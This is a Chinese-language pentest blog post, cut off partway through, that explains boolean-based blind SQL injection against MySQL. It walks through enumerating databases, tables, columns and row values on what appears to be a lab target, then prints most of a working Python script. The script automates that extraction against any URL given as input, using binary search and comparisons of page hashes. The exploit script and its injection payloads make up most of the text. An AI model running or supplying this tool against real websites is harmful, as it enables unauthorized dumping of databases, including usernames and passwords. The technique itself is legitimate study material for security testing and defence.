<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>SQL 注入之布尔型注入(MySQL) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>SQL 注入之布尔型注入(MySQL)</h1>
      
<div class="post-meta">
    <time>2016-06-23</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
</div>

      <div><h3 id="0x00-特点">0x00 特点</h3>
<pre tabindex="0"><code>当页面存在注入，但是没有显示位，且没有用echo &#34;mysql_error()&#34;输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
</code></pre><h3 id="0x01-利用方式">0x01 利用方式</h3>
<pre tabindex="0"><code>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
</code></pre><h3 id="0x02-注入步骤">0x02 注入步骤</h3>
<ol>
<li>
<p>找到注入点，判断闭合字符
<img src="/img/post/sqli8_get_closed_character.png" alt="得到闭合字符"></p>
</li>
<li>
<p>尝试猜解列数，得到显示位
<img src="/img/post/sqli8_order_by.png" alt="猜解列数">
<img src="/img/post/sqli8_display_point.png" alt="尝试得到显示位"></p>
</li>
<li>
<p>得到数据库名
<img src="/img/post/sqli8_get_db_num.png" alt="猜解数据库数量">
<img src="/img/post/sqli8_get_db_name_char.png" alt="猜第5个数据库第2个字符">
最终得到第五个数据库名为security</p>
</li>
<li>
<p>得到表名
<img src="/img/post/sqli8_get_table_num_name_len.png" alt="猜解表的数量和第4张表的表名长度">
<img src="/img/post/sqli8_get_table_name_char.png" alt="猜第4个表第1个字符">
最终依次猜的表名为users</p>
</li>
<li>
<p>得到列名
<img src="/img/post/sqli8_get_column_num.png" alt="猜解有几列">
<img src="/img/post/sqli8_get_column_name_len.png" alt="猜解users表第2列列名的长度">
<img src="/img/post/sqli8_get_column_name_one_char.png" alt="猜测users表第2列列名的第1个字符">
同理最终得到第2列列名为username，第3列列名为password</p>
</li>
<li>
<p>得到列值
<img src="/img/post/sqli8_get_column_value_num.png" alt="猜解数据条数">
<img src="/img/post/sqli8_get_column_value_len.png" alt="猜解第13条数据username字段值的长度">
<img src="/img/post/sqli8_get_column_value_char.png" alt="猜解第13条数据username字段值的前两个字符">
依次得到为admin4，同理可得其他数据</p>
</li>
</ol>
<h3 id="0x04-附上python脚本">0x04 附上python脚本</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># code by reber &lt;1070018473@qq.com&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>__author__<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;reber&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pyfiglet <span style="color:#f92672">import</span> figlet_format
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> optparse <span style="color:#f92672">import</span> OptionParser
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_md5_html</span>(url):
</span></span><span style="display:flex;"><span>    html <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    m2 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5()
</span></span><span style="display:flex;"><span>    m2<span style="color:#f92672">.</span>update(html)
</span></span><span style="display:flex;"><span>    md5_html <span style="color:#f92672">=</span> m2<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> md5_html
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get2</span>(<span style="color:#f92672">*</span>args): <span style="color:#75715e">#二分法得到数值</span>
</span></span><span style="display:flex;"><span>    low,high,url,payload,standard_md5 <span style="color:#f92672">=</span> args
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> low <span style="color:#f92672">&lt;=</span> high:
</span></span><span style="display:flex;"><span>        mid <span style="color:#f92672">=</span> (low <span style="color:#f92672">+</span> high)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        mid_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> payload<span style="color:#f92672">.</span>format(mid<span style="color:#f92672">=</span>mid)
</span></span><span style="display:flex;"><span>        mid_md5_html <span style="color:#f92672">=</span> get_md5_html(mid_url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> standard_md5 <span style="color:#f92672">==</span> mid_md5_html:
</span></span><span style="display:flex;"><span>            low <span style="color:#f92672">=</span> mid <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            high <span style="color:#f92672">=</span> mid<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        num <span style="color:#f92672">=</span> (low<span style="color:#f92672">+</span>high<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> num
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllDatabases</span>(url):
</span></span><span style="display:flex;"><span>    standard_md5 <span style="color:#f92672">=</span> get_md5_html(url)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print standard_md5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and ((select count(distinct+table_schema) from information_schema.tables) &gt; </span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">)--+&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload = payload.replace(&#39; &#39;,&#39;%20&#39;)</span>
</span></span><span style="display:flex;"><span>    db_num <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">100</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;The total number of database is: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> db_num
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,db_num):  <span style="color:#75715e">#一次循环输出一个数据库名</span>
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (length((select distinct table_schema from information_schema.tables limit </span><span style="color:#e6db74">{index}</span><span style="color:#e6db74">,1)) &gt; </span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">)--+&#34;</span><span style="color:#f92672">.</span>format(index<span style="color:#f92672">=</span>index,mid<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload = payload.replace(&#39; &#39;,&#39;%20&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        db_name_len <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">30</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print &#34;database name length:%d&#34; % db_name_len</span>
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[*] &#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,db_name_len<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):   <span style="color:#75715e">#一次for循环输出数据库名的一个字符            </span>
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (select ascii(substr((select distinct table_schema from information_schema.tables limit </span><span style="color:#e6db74">{index}</span><span style="color:#e6db74">,1), </span><span style="color:#e6db74">{x}</span><span style="color:#e6db74">, 1)) &gt; </span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">) --+&#34;</span><span style="color:#f92672">.</span>format(index<span style="color:#f92672">=</span>index,x<span style="color:#f92672">=</span>x,mid<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = payload.replace(&#39; &#39;,&#39;%20&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            str_ascii <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">126</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            database_name_one_str <span style="color:#f92672">=</span> chr(str_ascii)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print database_name_one_str</span>
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(database_name_one_str)
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>        print
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllTablesByDb</span>(url,db_name):
</span></span><span style="display:flex;"><span>    standard_md5 <span style="color:#f92672">=</span> get_md5_html(url)
</span></span><span style="display:flex;"><span>    db_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(db_name)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print standard_md5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and ((select count(distinct+table_name) from information_schema.tables where table_schema=</span><span style="color:#e6db74">{db_name_hex}</span><span style="color:#e6db74">) &gt; </span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">)--+&#34;</span><span style="color:#f92672">.</span>format(db_name_hex<span style="color:#f92672">=</span>db_name_hex,mid<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload = &#34;/**/&#34;.join(payload.split())</span>
</span></span><span style="display:flex;"><span>    db_num <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">200</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Database </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">: [</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> tables]&#34;</span> <span style="color:#f92672">%</span> (db_name,db_num)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,db_num):  <span style="color:#75715e">#一次循环输出一个表名</span>
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (length((select distinct table_name from information_schema.tables where table_schema=</span><span style="color:#e6db74">{db_name_hex}</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">{index}</span><span style="color:#e6db74">,1)) &gt; </span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">)--+&#34;</span><span style="color:#f92672">.</span>format(db_name_hex<span style="color:#f92672">=</span>db_name_hex,index<span style="color:#f92672">=</span>index,mid<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
</span></span><span style="display:flex;"><span>        table_name_len <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">30</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[*] &#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,table_name_len<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):   <span style="color:#75715e">#一次for循环输出表名的一个字符</span>
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema=</span><span style="color:#e6db74">{db_name_hex}</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">{index}</span><span style="color:#e6db74">,1), </span><span style="color:#e6db74">{x}</span><span style="color:#e6db74">, 1)) &gt; </span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">) --+&#34;</span><span style="color:#f92672">.</span>format(db_name_hex<span style="color:#f92672">=</span>db_name_hex,index<span style="color:#f92672">=</span>index,x<span style="color:#f92672">=</span>x,mid<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = &#34;/**/&#34;.join(payload.split())</span>
</span></span><span style="display:flex;"><span>            str_ascii <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">126</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_name_one_str <span style="color:#f92672">=</span> chr(str_ascii)
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(table_name_one_str)
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>        print 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllColumnsByTable</span>(url,table_name,db_name):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#for循环，一次得到一列的列名：</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#while循环得到列名的长度：</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#for循环，一次得出列名的一个字符</span>
</span></span><span style="display:flex;"><span>    standard_md5 <span style="color:#f92672">=</span> get_md5_html(url)
</span></span><span style="display:flex;"><span>    table_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(table_name)
</span></span><span style="display:flex;"><span>    db_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(db_name)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print standard_md5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and ((select count(distinct+column_name) from information_schema.columns where table_name=</span><span style="color:#e6db74">{table_name_hex}</span><span style="color:#e6db74"> and table_schema=</span><span style="color:#e6db74">{db_name_hex}</span><span style="color:#e6db74">) &gt; </span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">)--+&#34;</span><span style="color:#f92672">.</span>format(table_name_hex<span style="color:#f92672">=</span>table_name_hex,db_name_hex<span style="color:#f92672">=</span>db_name_hex,mid<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload = &#34;/**/&#34;.join(payload.split())</span>
</span></span><span style="display:flex;"><span>    column_num <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">200</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Table </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">: [</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> columns]&#34;</span> <span style="color:#f92672">%</span> (table_name,column_num)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,column_num):  <span style="color:#75715e">#一次循环输出一个列名</span>
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (length((select distinct column_name from information_schema.columns where table_name=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> and table_schema=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1)) &gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)--+&#34;</span><span style="color:#f92672">.</span>format(table_name_hex,db_name_hex,index,<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># payload = &#34;/**/&#34;.join(payload.split())</span>
</span></span><span style="display:flex;"><span>        column_name_len <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">30</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print &#34;column length is: %d&#34; % column_name_len</span>
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[*] &#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,column_name_len<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):   <span style="color:#75715e">#一次for循环输出列名的一个字符</span>
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (select ascii(substr((select distinct column_name from information_schema.columns where table_name=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> and table_schema=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1), </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, 1)) &gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">) --+&#34;</span><span style="color:#f92672">.</span>format(table_name_hex,db_name_hex,index,x,<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = &#34;/**/&#34;.join(payload.split())</span>
</span></span><span style="display:flex;"><span>            str_ascii <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">126</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            column_name_one_str <span style="color:#f92672">=</span> chr(str_ascii)
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(column_name_one_str)
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>        print
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllcontent</span>(url,column_name,table_name,db_name):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#for循环，一次得到一行的值</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#while循环得到每个字段的长度</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#for循环，一次得出一个字段的一个字符</span>
</span></span><span style="display:flex;"><span>    column_name <span style="color:#f92672">=</span> column_name<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;,&#39;</span>)
</span></span><span style="display:flex;"><span>    len_column_name <span style="color:#f92672">=</span> len(column_name)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print &#34;len_column_name:%d&#34; % len_column_name</span>
</span></span><span style="display:flex;"><span>    standard_md5 <span style="color:#f92672">=</span> get_md5_html(url)
</span></span><span style="display:flex;"><span>    table_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(table_name)
</span></span><span style="display:flex;"><span>    db_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(db_name)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print standard_md5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and ((select count(*) from </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">) &gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)--+&#34;</span><span style="color:#f92672">.</span>format(db_name,table_name,<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
</span></span><span style="display:flex;"><span>    column_value_num <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10000</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;The </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> table with </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> row value: &#34;</span> <span style="color:#f92672">%</span> (table_name,column_value_num)
</span></span><span style="display:flex;"><span>    stri <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,len_column_name):<span style="color:#75715e">#输出title</span>
</span></span><span style="display:flex;"><span>        stri <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> column_name[x]
</span></span><span style="display:flex;"><span>    print stri
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,column_value_num):  <span style="color:#75715e">#一次循环输出一行数据</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,len_column_name):  <span style="color:#75715e">#一次输出一行的一列的值,循环完输出一行的值</span>
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (length((select </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> from </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1)) &gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)--+&#34;</span><span style="color:#f92672">.</span>format(column_name[y],db_name,table_name,index,<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = &#34;/**/&#34;.join(payload.split())</span>
</span></span><span style="display:flex;"><span>            column_value_len <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">30</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print &#34;column value length is: %d&#34; % column_value_len</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,column_value_len<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>): <span style="color:#75715e">#得到一行数据的一列的值</span>
</span></span><span style="display:flex;"><span>                payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and (select ascii(substr((select </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> from </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1), </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, 1)) &gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">) --+&#34;</span><span style="color:#f92672">.</span>format(column_name[y],db_name,table_name,index,x,<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{mid}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># payload = &#34;/**/&#34;.join(payload.split())</span>
</span></span><span style="display:flex;"><span>                str_ascii <span style="color:#f92672">=</span> get2(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">126</span>,url,payload,standard_md5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                column_name_one_str <span style="color:#f92672">=</span> chr(str_ascii)
</span></span><span style="display:flex;"><span>                sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(column_name_one_str)
</span></span><span style="display:flex;"><span>                sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        print
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    print figlet_format(<span style="color:#e6db74">&#34;sql-bool&#34;</span>)
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> OptionParser(usage<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Usage: python %prog [options]&#39;</span>,version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;%prog 1.2&#39;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-u&#34;</span>,<span style="color:#e6db74">&#34;--URL&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
